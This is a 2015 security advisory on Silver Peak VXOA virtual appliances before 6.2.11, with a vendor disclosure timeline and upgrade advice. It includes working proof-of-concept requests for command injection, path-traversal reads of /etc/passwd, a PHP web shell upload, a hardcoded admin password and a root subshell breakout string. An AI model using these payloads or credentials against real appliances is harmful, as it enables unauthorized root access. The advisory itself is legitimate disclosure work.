@@ -1,0 +1,214 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+Silver Peak VXOA Multiple Vulnerabilities
+Affected versions: Silver Peak VX < 6.2.11
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/Silverpeak-Advisory-Final.pdf
+
++-----------+
+|Description|
++-----------+
+The Silver Peak VX virtual appliance running VXOA before version 6.2.11
+contains a number of security vulnerabilities, including command
+injection, unauthenticated file read, mass assignment, shell upload, and
+hardcoded credentials. By combining these vulnerabilities, an attacker
+may remotely obtain root privileges on the underlying host.
+
++------------+
+|Exploitation|
++------------+
+==Command Injection==
+A user with administrative access to the REST JSON interface of the VX
+web server may execute arbitrary commands on the operating system. The
+injection point lies in the "snmp" call, which does not sanitise the
+"auth_key" parameter before including it in an executed command string.
+The following command injection PoC writes the user's id to a file on
+the filesystem.
+[Command Injection PoC]
+POST /rest/json/snmp HTTP/1.1
+Host: [HOST]
+Content-Type: application/json; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 368
+Cookie: connect.sid=[VALID];
+
+{"access":{"rocommunity":"public"},"listen":{"enable":true},"traps":{"trap_community":"public","enable":true},"auto_launch":true,"sysdescr":"",
+"syscontact":"","syslocation":"","v3":{"users":{"admin":{"hash_type":"sha","auth_key":"a;echo
+`id` >
+/var/tmp/cmd_inj","self":"admin","privacy_key":"","privacy_type":"aes-128","enable":false}}},"encAuth":false,"encPri":false}
+
+==Unauthenticated File Read==
+A user with the ability to access the VX web server interface may make
+an unauthenticated call to a web interface function that allows them to
+read arbitrary files on the disk with the permission of the web server
+user "apache". Two functions are affected by this vulnerability,
+"save_file.php" and "save_config_file.php".
+[Unauthenticated File Read PoC]
+curl -sk
+"https://[HOST]/6.2.5.0_52054/php/save_file.php?ftype=log&fname=../../etc/passwd"
+
+OR
+
+curl -sk
+"https://[HOST]/6.2.5.0_52054/php/save_config_file.php?filename=../../../../../../../../etc/passwd"
+
+
+==Mass Assignment==
+A user with access to the REST JSON interface of the VX web server may
+alter undocumented parameters of the "users" call, allowing them to
+change a user's login shell to bash. This can be used to evade the
+limited subshell enforced by the SSH server on the appliance.
+[Mass assignment PoC]
+POST /rest/json/users HTTP/1.1
+Host: [HOST]
+Content-Type: application/json; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 366
+Cookie: connect.sid=[VALID];
+
+{"users":{"basic":{"self":"basic","enable":true,"gid":0,"password":"[SNIP]","shell":"/bin/bash"}},[SNIP
+other users]}}
+
+==Shell Upload==
+A user with monitor or administrative access to the web interface of the
+VX web server may upload a PHP shell in order to execute arbitrary
+commands as the web server user "apache".  A POST request containing the
+PHP shell is made to the "configdb_file.php" endpoint. This uploads the
+shell to a directory with a randomly generated name corresponding to the
+user's SOAP interface session. This random value may be obtained from
+"home.php", and the uploaded shell accessed within that directory.  The
+following PoC details uploading the shell, obtaining the SOAP directory
+name, and using the shell.
+[Shell upload PoC]
+POST /6.2.5.0_52054/php/configdb_file.php?seenform=1 HTTP/1.1
+Host: [HOST]
+Cookie: PHPSESSID=[VALID];
+Content-Type: multipart/form-data;
+boundary=---------------------------18932870311933452824851992207
+Content-Length: 301
+
+-----------------------------18932870311933452824851992207
+Content-Disposition: form-data; name="userfile"; filename="shell.php"
+Content-Type: text/html
+
+<?php
+$cmd = $_GET["cmd"];
+$output = shell_exec($cmd);
+echo "$output";
+?>
+-----------------------------18932870311933452824851992207
+#End of request
+
+$curl -sk -b 'PHPSESSID=[VALID]'
+"https://[HOST]/6.2.5.0_52054/php/home.php" | grep "flowFile"
+  var flowFile =
+"/opt/tms/lib/web/content/webui/php/temp/soap/wcupfu36lkvkyutxc2h1swnxsnz8rsffijnhod9zmwr270oreuoatajxcfq71sf/";
+
+
+$curl -sk
+"https://[HOST]/6.2.5.0_52054/php/temp/soap/wcupfu36lkvkyutxc2h1swnxsnz8rsffijnhod9zmwr270oreuoatajxcfq71sf/shell.php?cmd=id"
+  uid=48(apache) gid=48(apache) groups=48(apache)
+
+
+==Hardcoded Account==
+The "spsadmin" account is predefined in the VX appliance, and is hidden
+from user account lists in the web and subshell interfaces. The account
+has a hardcoded password of "Silverpeak123", and cannot be logged into
+through the regular web interface, or the subshell over SSH. However,
+the account can log in via the web JSON interface, and execute JSON API
+calls with administrative privileges. This can include creating new
+users, with which an attacker may successfully log into the SSH or web
+interfaces, and also exploiting the Command Injection bug detailed
+earlier in this advisory.  The following PoC details the request and
+credentials used to obtain a valid REST cookie:
+[Hardcoded account login PoC]
+POST /rest/json/login HTTP/1.1
+Host: [host]
+Content-Type: application/json; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 46
+
+{"user":"spsadmin","password":"Silverpeak123"}
+
+==Subshell Breakout==
+An administrative user with access to the enable menu of the login
+subshell may enter a hardcoded string to obtain a bash shell on the
+operating system.
+[Subshell Breakout POC]
+silverpeak > en
+silverpeak # _spsshell
+[admin@silverpeak root]# id
+uid=0(admin) gid=0(root) groups=0(root)
+
++----------+
+| Solution |
++----------+
+Users of the 6.2.x branch should upgrade to version 6.2.11 of VXOA in
+order to protect against these issues. Silver Peak has advised that
+users of the 7.2.x branch are only vulnerable to the command injection
+vulnerability, which will be patched in version 7.3.
+
++-------------------+
+|Disclosure Timeline|
++-------------------+
+01/04/2015 - Email sent to info address asking for a security contact.
+09/04/2015 - Email sent to info and security addresses asking for a
+security contact.
+21/04/2015 - Email sent to CEO regarding security contact.
+21/04/2015 - Response from CEO providing security contact details.
+22/04/2015 - Email sent to security contact asking for PGP key.
+22/04/2015 - Received PGP key, sent advisory.
+22/04/2015 - Email received confirming receipt of advisory.
+22/06/2015 - Email sent asking for update on advisory.
+23/06/2015 - Vendor details fixes in place, states that all issues have
+been fixed in 6.2.11.0, and only the command injection remains unfixed
+in the 7.2.x version.
+17/07/2015 - Email sent regarding resolution of unfixed issue.
+17/07/2015 - Received response stating the command injection issue is
+only relevant to customers who have disabled shell access.
+21/07/2015 - Email sent asking for clarification on the vendor stance.
+21/07/2015 - Vendor states command injection vulnerability is only an
+issue for customers with shell access disabled as they otherwise have
+the ability to execute commands through the shell, and that the issue
+will be fixed in release 7.3.
+09/09/2015 - Public advisory release.
+
++-----------------------------+
+|About Security-Assessment.com|
++-----------------------------+
+
+Security-Assessment.com is a leading team of Information Security
+consultants specialising in providing high quality Information Security
+services to clients throughout the Asia Pacific region. Our clients
+include some of the largest globally recognised companies in areas such
+as finance, telecommunications, broadcasting, legal and government. Our
+aim is to provide the very best independent advice and a high level of
+technical expertise while creating long and lasting professional
+relationships with our clients.
+
+Security-Assessment.com is committed to security research and
+development, and its team continues to identify and responsibly publish
+vulnerabilities in public and private software vendor's products.
+Members of the Security-Assessment.com R&D team are globally recognised
+through their release of whitepapers and presentations related to new
+security research.
+
+For further information on this issue or any of our service offerings,
+contact us:
+Web www.security-assessment.com
+Email info () security-assessment.com
+Phone +64 4 470 1650
